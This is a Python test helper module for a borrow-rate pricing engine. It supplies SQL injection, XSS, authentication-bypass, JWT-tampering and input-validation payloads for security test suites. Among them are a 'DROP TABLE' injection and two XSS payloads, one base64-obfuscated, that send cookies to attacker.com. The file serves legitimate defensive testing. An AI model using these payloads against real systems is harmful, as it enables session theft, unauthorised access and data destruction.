"""
Helper module providing various security test payloads for the Borrow Rate & Locate Fee Pricing Engine.
Contains predefined and dynamically generated payloads for testing SQL injection, XSS, authentication bypass,
and input validation vulnerabilities. These payloads are used by security test suites to verify the system's
resistance to common security attacks.
"""

import random
import string
import typing
from typing import Dict, List, Union, Any, Optional
import datetime
import base64
import json
import decimal
from decimal import Decimal
import jwt  # version: 2.6.0

# Internal imports
from ..config.settings import get_test_settings, TestSettings
from src.backend.utils.validation import (
    MIN_POSITION_VALUE,
    MAX_POSITION_VALUE,
    MIN_LOAN_DAYS,
    MAX_LOAN_DAYS
)

# Get settings
settings = get_test_settings()

# Predefined SQL injection payloads
SQL_INJECTION_PAYLOADS = {
    "basic": [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "') OR ('1'='1",
        "1' OR '1' = '1",
        "1 OR 1=1--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT NULL,NULL,NULL--",
        "'; DROP TABLE stocks--"
    ],
    "advanced": [
        "' OR EXISTS(SELECT * FROM stocks)--",
        "' OR (SELECT COUNT(*) FROM stocks)>0--",
        "' UNION ALL SELECT table_name,column_name,1 FROM information_schema.columns--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--"
    ]
}

# Predefined XSS payloads
XSS_PAYLOADS = {
    "basic": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')"
    ],
    "advanced": [
        "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
        "<img src=x onerror=\"eval(atob('ZmV0Y2goJ2h0dHBzOi8vYXR0YWNrZXIuY29tL3N0ZWFsP2Nvb2tpZT0nK2RvY3VtZW50LmNvb2tpZSk='))\" >",
        "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
        "<iframe src=\"javascript:alert('XSS')\"></iframe>",
        "<math><mtext><table><mglyph><svg><mtext><textarea><a title=\"\" href=\"javascript:alert('XSS')\">CLICK</a></textarea></mtext></svg></mglyph></table></mtext></math>"
    ]
}

# Predefined authentication bypass payloads
AUTH_BYPASS_PAYLOADS = {
    "api_keys": [
        "",
        "null",
        "undefined",
        "NONE",
        "test",
        "admin",
        "administrator",
        "root",
        "guest",
        "user"
    ],
    "headers": [
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-Host": "internal-system"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},
        {"X-ProxyUser": "admin"},
        {"X-Original-User": "admin"},
        {"Authorization": "Basic YWRtaW46YWRtaW4="}
    ]
}

# Predefined input validation payloads
INPUT_VALIDATION_PAYLOADS = {
    "ticker": {
        "invalid_format": [
            "",
            "a",
            "1234",
            "ABCDEF",
            "A-B",
            "A.B",
            "A B",
            "123",
            "ab",
            "A1",
            "AAAAAAA"
        ],
        "special_chars": [
            "A'B",
            "A\"B",
            "A<B",
            "A>B",
            "A&B",
            "A;B",
            "A|B",
            "A\\B",
            "A/B",
            "A%B"
        ]
    },
    "position_value": {
        "invalid_values": [
            "-1",
            "0",
            "0.001",
            "1000000001",
            "1e10",
            "NaN",
            "Infinity",
            "-Infinity"
        ],
        "invalid_format": [
            "abc",
            "123abc",
            "123.456.789",
            "123,456",
            "$100",
            "100$"
        ]
    },
    "loan_days": {
        "invalid_values": [
            "-1",
            "0",
            "366",
            "1000"
        ],
        "invalid_format": [
            "abc",
            "1.5",
            "1e2",
            "1day",
            "day1"
        ]
    },
    "client_id": {
        "invalid_format": [
            "",
            "ab",
            "a!b", "a@b", "a#b", "a$b", "a%b", "a^b", "a&b", "a*b",
            "a(b", "a)b", "a+b", "a=b", "a{b", "a}b", "a[b", "a]b",
            "a|b", "a\\b", "a;b", "a:b", "a'b", "a\"b", "a<b", "a>b",
            "a,b", "a.b", "a/b", "a?b"
        ],
        "too_long": "a" * 51  # Exceeds the 50 character limit
    }
}


def get_random_payload(category: str, payload_type: str) -> Union[str, Dict[str, str]]:
    """
    Returns a random payload from a specified category and type
    
    Args:
        category: The payload category (e.g., "sql_injection", "xss")
        payload_type: The type of payload within the category (e.g., "basic", "advanced")
        
    Returns:
        A randomly selected payload
        
    Raises:
        ValueError: If category or payload_type is not found
    """
    if category == "sql_injection":
        if payload_type not in SQL_INJECTION_PAYLOADS:
            raise ValueError(f"Unknown SQL injection payload type: {payload_type}")
        return random.choice(SQL_INJECTION_PAYLOADS[payload_type])
    
    elif category == "xss":
        if payload_type not in XSS_PAYLOADS:
            raise ValueError(f"Unknown XSS payload type: {payload_type}")
        return random.choice(XSS_PAYLOADS[payload_type])
    
    elif category == "auth_bypass":
        if payload_type not in AUTH_BYPASS_PAYLOADS:
            raise ValueError(f"Unknown auth bypass payload type: {payload_type}")
        return random.choice(AUTH_BYPASS_PAYLOADS[payload_type])
    
    elif category == "input_validation":
        try:
            param = random.choice(list(INPUT_VALIDATION_PAYLOADS.keys()))
            payload_subtype = random.choice(list(INPUT_VALIDATION_PAYLOADS[param].keys()))
            return random.choice(INPUT_VALIDATION_PAYLOADS[param][payload_subtype])
        except (KeyError, IndexError):
            raise ValueError(f"Unable to find input validation payload for type: {payload_type}")
    
    else:
        raise ValueError(f"Unknown payload category: {category}")


def generate_boundary_value(min_value: Union[int, float, Decimal], 
                           max_value: Union[int, float, Decimal],
                           boundary_type: str) -> Union[int, float, Decimal]:
    """
    Generates a boundary value for numeric parameters based on min/max values
    
    Args:
        min_value: The minimum allowed value
        max_value: The maximum allowed value
        boundary_type: Type of boundary value to generate
        
    Returns:
        Generated boundary value
        
    Raises:
        ValueError: If boundary_type is unknown
    """
    # Convert to Decimal for precise numeric operations
    if not isinstance(min_value, Decimal):
        min_value = Decimal(str(min_value))
    if not isinstance(max_value, Decimal):
        max_value = Decimal(str(max_value))
    
    if boundary_type == "min":
        return min_value
    elif boundary_type == "min-1":
        return min_value - Decimal('1')
    elif boundary_type == "min+1":
        # Get the smallest increment based on the precision of min_value
        min_str = str(min_value)
        if '.' in min_str:
            decimal_places = len(min_str.split('.')[1])
            smallest_increment = Decimal('0.' + '0' * (decimal_places - 1) + '1')
        else:
            smallest_increment = Decimal('1')
        return min_value + smallest_increment
    elif boundary_type == "max":
        return max_value
    elif boundary_type == "max-1":
        # Get the smallest decrement based on the precision of max_value
        max_str = str(max_value)
        if '.' in max_str:
            decimal_places = len(max_str.split('.')[1])
            smallest_decrement = Decimal('0.' + '0' * (decimal_places - 1) + '1')
        else:
            smallest_decrement = Decimal('1')
        return max_value - smallest_decrement
    elif boundary_type == "max+1":
        return max_value + Decimal('1')
    elif boundary_type == "zero":
        return Decimal('0')
    elif boundary_type == "negative":
        return Decimal('-1')
    else:
        raise ValueError(f"Unknown boundary type: {boundary_type}")


def generate_random_string(length: int, char_type: str) -> str:
    """
    Generates a random string with specified characteristics
    
    Args:
        length: Length of the string to generate
        char_type: Type of characters to include
        
    Returns:
        Generated random string
    """
    if char_type == "alpha":
        charset = string.ascii_letters
    elif char_type == "numeric":
        charset = string.digits
    elif char_type == "alphanumeric":
        charset = string.ascii_letters + string.digits
    elif char_type == "special":
        charset = string.punctuation
    elif char_type == "all":
        charset = string.ascii_letters + string.digits + string.punctuation
    else:
        charset = string.ascii_letters  # Default to alpha
    
    return ''.join(random.choice(charset) for _ in range(length))


def generate_malformed_json(base_json: Dict[str, Any], malformation_type: str) -> str:
    """
    Generates malformed JSON for testing JSON parsing
    
    Args:
        base_json: Base JSON object to malform
        malformation_type: Type of malformation to introduce
        
    Returns:
        Malformed JSON string
    """
    # Convert to string
    json_str = json.dumps(base_json)
    
    if malformation_type == "unclosed_object":
        # Remove the closing brace
        return json_str[:-1]
    
    elif malformation_type == "unclosed_array":
        # Find an array and remove its closing bracket
        if "[" in json_str and "]" in json_str:
            last_bracket = json_str.rindex("]")
            return json_str[:last_bracket] + json_str[last_bracket+1:]
        return json_str
    
    elif malformation_type == "missing_comma":
        # Remove a comma between elements
        if "," in json_str:
            comma_index = json_str.find(",")
            return json_str[:comma_index] + json_str[comma_index+1:]
        return json_str
    
    elif malformation_type == "extra_comma":
        # Add an extra comma
        if ":" in json_str:
            colon_index = json_str.find(":")
            return json_str[:colon_index+1] + "," + json_str[colon_index+1:]
        return json_str
    
    elif malformation_type == "invalid_value":
        # Add an invalid value (unquoted string)
        return json_str[:-1] + ", \"invalid\": invalid}"
    
    elif malformation_type == "duplicate_key":
        # Add a duplicate key
        if "\"" in json_str:
            first_key_end = json_str.find("\"", 1)
            first_key = json_str[1:first_key_end]
            return json_str[:-1] + ", \"" + first_key + "\": \"duplicate\"}"
        return json_str
    
    elif malformation_type == "invalid_key":
        # Add a key that's not a string
        return json_str[:-1] + ", 123: \"invalid\"}"
    
    else:
        return json_str


class SQLInjectionPayloads:
    """
    Provides SQL injection payloads for testing database security
    """
    
    def __init__(self):
        """
        Initializes the SQL injection payloads collection
        """
        self._payloads = SQL_INJECTION_PAYLOADS
        
        # Try to load additional payloads from settings if available
        try:
            additional_payloads = settings.get_test_payload("sql_injection", "all")
            if additional_payloads:
                for payload_type, payloads in additional_payloads.items():
                    if payload_type in self._payloads:
                        self._payloads[payload_type].extend(payloads)
                    else:
                        self._payloads[payload_type] = payloads
        except (ValueError, AttributeError):
            # Ignore if settings don't have additional payloads
            pass
    
    def get_payload(self, payload_type: str, index: Optional[int] = None) -> Union[str, List[str]]:
        """
        Gets a specific SQL injection payload by type and index
        
        Args:
            payload_type: Type of SQL injection payload (e.g., "basic", "advanced")
            index: Optional index of specific payload, if None returns all payloads of the type
            
        Returns:
            SQL injection payload(s)
            
        Raises:
            ValueError: If payload_type is not found
            IndexError: If index is out of range
        """
        if payload_type not in self._payloads:
            raise ValueError(f"Unknown SQL injection payload type: {payload_type}")
        
        if index is None:
            return self._payloads[payload_type]
        
        if index < 0 or index >= len(self._payloads[payload_type]):
            raise IndexError(f"Index {index} out of range for payload type {payload_type}")
        
        return self._payloads[payload_type][index]
    
    def get_random_payload(self, payload_type: str) -> str:
        """
        Gets a random SQL injection payload of the specified type
        
        Args:
            payload_type: Type of SQL injection payload (e.g., "basic", "advanced")
            
        Returns:
            Random SQL injection payload
            
        Raises:
            ValueError: If payload_type is not found
        """
        if payload_type not in self._payloads:
            raise ValueError(f"Unknown SQL injection payload type: {payload_type}")
        
        return random.choice(self._payloads[payload_type])
    
    def generate_custom_payload(self, db_type: str, target_table: str, 
                              target_column: Optional[str] = None) -> str:
        """
        Generates a custom SQL injection payload for a specific database type
        
        Args:
            db_type: Type of database (e.g., "postgresql", "mysql")
            target_table: Name of the target table
            target_column: Optional target column name
            
        Returns:
            Custom SQL injection payload
        """
        if db_type.lower() == "postgresql":
            if target_column:
                return f"' OR EXISTS(SELECT {target_column} FROM {target_table}) --"
            else:
                return f"' OR EXISTS(SELECT * FROM {target_table}) --"
        
        elif db_type.lower() == "mysql":
            if target_column:
                return f"' OR (SELECT COUNT({target_column}) FROM {target_table})>0 --"
            else:
                return f"' OR (SELECT COUNT(*) FROM {target_table})>0 --"
        
        elif db_type.lower() == "sqlite":
            if target_column:
                return f"' OR EXISTS(SELECT {target_column} FROM {target_table}) --"
            else:
                return f"' OR EXISTS(SELECT * FROM {target_table}) --"
                
        else:
            # Generic payload
            if target_column:
                return f"' OR 1=1 AND EXISTS(SELECT {target_column} FROM {target_table}) --"
            else:
                return f"' OR 1=1 AND EXISTS(SELECT * FROM {target_table}) --"


class XSSPayloads:
    """
    Provides XSS payloads for testing output encoding
    """
    
    def __init__(self):
        """
        Initializes the XSS payloads collection
        """
        self._payloads = XSS_PAYLOADS
        
        # Try to load additional payloads from settings if available
        try:
            additional_payloads = settings.get_test_payload("xss", "all")
            if additional_payloads:
                for payload_type, payloads in additional_payloads.items():
                    if payload_type in self._payloads:
                        self._payloads[payload_type].extend(payloads)
                    else:
                        self._payloads[payload_type] = payloads
        except (ValueError, AttributeError):
            # Ignore if settings don't have additional payloads
            pass
    
    def get_payload(self, payload_type: str, index: Optional[int] = None) -> Union[str, List[str]]:
        """
        Gets a specific XSS payload by type and index
        
        Args:
            payload_type: Type of XSS payload (e.g., "basic", "advanced")
            index: Optional index of specific payload, if None returns all payloads of the type
            
        Returns:
            XSS payload(s)
            
        Raises:
            ValueError: If payload_type is not found
            IndexError: If index is out of range
        """
        if payload_type not in self._payloads:
            raise ValueError(f"Unknown XSS payload type: {payload_type}")
        
        if index is None:
            return self._payloads[payload_type]
        
        if index < 0 or index >= len(self._payloads[payload_type]):
            raise IndexError(f"Index {index} out of range for payload type {payload_type}")
        
        return self._payloads[payload_type][index]
    
    def get_random_payload(self, payload_type: str) -> str:
        """
        Gets a random XSS payload of the specified type
        
        Args:
            payload_type: Type of XSS payload (e.g., "basic", "advanced")
            
        Returns:
            Random XSS payload
            
        Raises:
            ValueError: If payload_type is not found
        """
        if payload_type not in self._payloads:
            raise ValueError(f"Unknown XSS payload type: {payload_type}")
        
        return random.choice(self._payloads[payload_type])
    
    def generate_context_aware_payload(self, context: str) -> str:
        """
        Generates a context-aware XSS payload based on the insertion point
        
        Args:
            context: The context where the XSS payload will be inserted
            
        Returns:
            Context-aware XSS payload
        """
        if context == "html":
            return "<script>alert('XSS')</script>"
        
        elif context == "attribute":
            return "\" onmouseover=\"alert('XSS')\""
        
        elif context == "js":
            return "\'; alert('XSS'); //"
        
        elif context == "url":
            return "javascript:alert('XSS')"
        
        elif context == "css":
            return "expression(alert('XSS'))"
        
        else:
            # Default HTML context
            return "<img src=x onerror=alert('XSS')>"


class AuthBypassPayloads:
    """
    Provides authentication bypass payloads for testing authentication security
    """
    
    def __init__(self):
        """
        Initializes the authentication bypass payloads collection
        """
        self._payloads = AUTH_BYPASS_PAYLOADS
        
        # Try to load additional payloads from settings if available
        try:
            additional_payloads = settings.get_test_payload("authentication_bypass", "all")
            if additional_payloads:
                for payload_type, payloads in additional_payloads.items():
                    if payload_type in self._payloads:
                        self._payloads[payload_type].extend(payloads)
                    else:
                        self._payloads[payload_type] = payloads
        except (ValueError, AttributeError):
            # Ignore if settings don't have additional payloads
            pass
    
    def get_payload(self, payload_type: str, index: Optional[int] = None) -> Union[str, Dict[str, str], List[Union[str, Dict[str, str]]]]:
        """
        Gets a specific authentication bypass payload by type and index
        
        Args:
            payload_type: Type of authentication bypass payload (e.g., "api_keys", "headers")
            index: Optional index of specific payload, if None returns all payloads of the type
            
        Returns:
            Authentication bypass payload(s)
            
        Raises:
            ValueError: If payload_type is not found
            IndexError: If index is out of range
        """
        if payload_type not in self._payloads:
            raise ValueError(f"Unknown authentication bypass payload type: {payload_type}")
        
        if index is None:
            return self._payloads[payload_type]
        
        if index < 0 or index >= len(self._payloads[payload_type]):
            raise IndexError(f"Index {index} out of range for payload type {payload_type}")
        
        return self._payloads[payload_type][index]
    
    def get_random_payload(self, payload_type: str) -> Union[str, Dict[str, str]]:
        """
        Gets a random authentication bypass payload of the specified type
        
        Args:
            payload_type: Type of authentication bypass payload (e.g., "api_keys", "headers")
            
        Returns:
            Random authentication bypass payload
            
        Raises:
            ValueError: If payload_type is not found
        """
        if payload_type not in self._payloads:
            raise ValueError(f"Unknown authentication bypass payload type: {payload_type}")
        
        return random.choice(self._payloads[payload_type])
    
    def generate_tampered_jwt(self, original_token: str, tampering_type: str) -> str:
        """
        Generates a tampered JWT token for testing token validation
        
        Args:
            original_token: Original JWT token to tamper with
            tampering_type: Type of tampering to apply
            
        Returns:
            Tampered JWT token
        """
        # Decode the token without verification
        try:
            decoded = jwt.decode(original_token, options={"verify_signature": False})
        except jwt.PyJWTError:
            # If we can't decode, return the original token
            return original_token
        
        # Get the header
        try:
            header_segment = original_token.split('.')[0]
            header = json.loads(base64.b64decode(header_segment + '==').decode('utf-8'))
        except (IndexError, json.JSONDecodeError, UnicodeDecodeError):
            # If we can't get the header, return the original token
            return original_token
        
        if tampering_type == "alg_none":
            # Change algorithm to 'none'
            header['alg'] = 'none'
            # Re-encode the token without signature
            segments = [
                base64.urlsafe_b64encode(json.dumps(header).encode()).decode().replace('=', ''),
                base64.urlsafe_b64encode(json.dumps(decoded).encode()).decode().replace('=', '')
            ]
            return '.'.join(segments) + '.'
        
        elif tampering_type == "alg_change":
            # Change algorithm to a weaker one
            header['alg'] = 'HS256'  # Assume it was something stronger
            # Re-encode with a weak signature (all zeros)
            return jwt.encode(decoded, '0000000000000000', algorithm='HS256')
        
        elif tampering_type == "exp_extend":
            # Extend expiration time
            if 'exp' in decoded:
                decoded['exp'] = int(datetime.datetime.now().timestamp()) + 31536000  # +1 year
            return jwt.encode(decoded, 'tampered_secret', algorithm=header.get('alg', 'HS256'))
        
        elif tampering_type == "role_escalation":
            # Modify role or permissions claim
            if 'role' in decoded:
                decoded['role'] = 'admin'
            elif 'permissions' in decoded:
                decoded['permissions'] = ['admin', 'read', 'write', 'delete']
            elif 'scope' in decoded:
                decoded['scope'] = 'admin read write delete'
            else:
                # Add a role claim if none exists
                decoded['role'] = 'admin'
            
            return jwt.encode(decoded, 'tampered_secret', algorithm=header.get('alg', 'HS256'))
        
        elif tampering_type == "signature_strip":
            # Strip signature part
            parts = original_token.split('.')
            if len(parts) >= 2:
                return '.'.join(parts[:2]) + '.'
            return original_token
        
        else:
            # Default: return the original token
            return original_token


class InputValidationPayloads:
    """
    Provides input validation payloads for testing input validation and boundary conditions
    """
    
    def __init__(self):
        """
        Initializes the input validation payloads collection
        """
        self._payloads = INPUT_VALIDATION_PAYLOADS
        
        # Try to load additional payloads from settings if available
        try:
            additional_payloads = settings.get_test_payload("input_validation", "all")
            if additional_payloads:
                for param, param_payloads in additional_payloads.items():
                    if param in self._payloads:
                        for payload_type, payloads in param_payloads.items():
                            if payload_type in self._payloads[param]:
                                self._payloads[param][payload_type].extend(payloads)
                            else:
                                self._payloads[param][payload_type] = payloads
                    else:
                        self._payloads[param] = param_payloads
        except (ValueError, AttributeError):
            # Ignore if settings don't have additional payloads
            pass
    
    def get_payload(self, parameter: str, payload_type: str, 
                  index: Optional[int] = None) -> Union[str, List[str]]:
        """
        Gets specific input validation payloads by parameter and type
        
        Args:
            parameter: Parameter to get payloads for (e.g., "ticker", "position_value")
            payload_type: Type of payload within the parameter (e.g., "invalid_format")
            index: Optional index of specific payload, if None returns all payloads of the type
            
        Returns:
            Input validation payload(s)
            
        Raises:
            ValueError: If parameter or payload_type is not found
            IndexError: If index is out of range
        """
        if parameter not in self._payloads:
            raise ValueError(f"Unknown parameter: {parameter}")
        
        if payload_type not in self._payloads[parameter]:
            raise ValueError(f"Unknown payload type '{payload_type}' for parameter '{parameter}'")
        
        if index is None:
            return self._payloads[parameter][payload_type]
        
        if index < 0 or index >= len(self._payloads[parameter][payload_type]):
            raise IndexError(f"Index {index} out of range for parameter '{parameter}' and type '{payload_type}'")
        
        return self._payloads[parameter][payload_type][index]
    
    def generate_boundary_values(self, parameter: str) -> Dict[str, Union[int, float, Decimal]]:
        """
        Generates boundary values for numeric parameters
        
        Args:
            parameter: Parameter to generate boundary values for
            
        Returns:
            Dictionary of boundary values
        """
        result = {}
        
        if parameter == "position_value":
            min_val = MIN_POSITION_VALUE
            max_val = MAX_POSITION_VALUE
            
            # Exact boundaries
            result["min"] = min_val
            result["max"] = max_val
            
            # Just inside boundaries
            if min_val > 0:
                result["min+0.01"] = min_val + Decimal('0.01')
            result["max-0.01"] = max_val - Decimal('0.01')
            
            # Just outside boundaries
            if min_val > 0:
                result["min-0.01"] = min_val - Decimal('0.01')
            result["max+0.01"] = max_val + Decimal('0.01')
            
            # Special values
            result["zero"] = Decimal('0')
            result["negative"] = Decimal('-1')
            
        elif parameter == "loan_days":
            min_val = MIN_LOAN_DAYS
            max_val = MAX_LOAN_DAYS
            
            # Exact boundaries
            result["min"] = min_val
            result["max"] = max_val
            
            # Just inside boundaries
            result["min+1"] = min_val + 1
            result["max-1"] = max_val - 1
            
            # Just outside boundaries
            result["min-1"] = min_val - 1
            result["max+1"] = max_val + 1
            
            # Special values
            result["zero"] = 0
            result["negative"] = -1
            
        else:
            # Non-numeric parameters don't have clear boundary values
            pass
        
        return result
    
    def generate_malformed_request_objects(self, base_request: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Generates malformed request objects for testing request validation
        
        Args:
            base_request: Base request object to modify
            
        Returns:
            List of malformed request objects
        """
        result = []
        
        # Make a copy of the base request to avoid modifying the original
        base = base_request.copy()
        
        # 1. Missing required parameters
        required_params = ["ticker", "position_value", "loan_days", "client_id"]
        for param in required_params:
            if param in base:
                malformed = base.copy()
                del malformed[param]
                result.append(malformed)
        
        # 2. Additional unexpected parameters
        malformed = base.copy()
        malformed["unexpected_param"] = "This shouldn't be here"
        result.append(malformed)
        
        # 3. Parameters of incorrect types
        for param in required_params:
            if param in base:
                # Skip if we don't know what type this parameter should be
                if param not in self._payloads:
                    continue
                
                malformed = base.copy()
                # Use a different type than expected
                if param == "ticker":
                    malformed[param] = 12345  # Number instead of string
                elif param == "position_value":
                    malformed[param] = "not_a_number"  # String instead of number
                elif param == "loan_days":
                    malformed[param] = "not_a_number"  # String instead of number
                elif param == "client_id":
                    malformed[param] = 12345  # Number instead of string
                
                result.append(malformed)
        
        # 4. Malformed structure (add a nested object where not expected)
        malformed = base.copy()
        malformed["nested"] = {"key": "value"}
        result.append(malformed)
        
        return result
    
    def generate_oversized_inputs(self, parameter: str, size_multiplier: int = 10) -> str:
        """
        Generates oversized inputs for testing input size limits
        
        Args:
            parameter: Parameter to generate oversized input for
            size_multiplier: Multiplier for the size of the input
            
        Returns:
            Oversized input value
        """
        if parameter == "ticker":
            # Generate oversized ticker symbol (normal max is 5 characters)
            return "A" * (5 * size_multiplier)
        
        elif parameter == "position_value":
            # Generate extremely large number
            return str(int(MAX_POSITION_VALUE) * size_multiplier)
        
        elif parameter == "loan_days":
            # Generate extremely large number
            return str(MAX_LOAN_DAYS * size_multiplier)
        
        elif parameter == "client_id":
            # Generate very long string (normal max is 50 characters)
            return "a" * (50 * size_multiplier)
        
        else:
            # Default to a long random string
            return generate_random_string(100 * size_multiplier, "alphanumeric")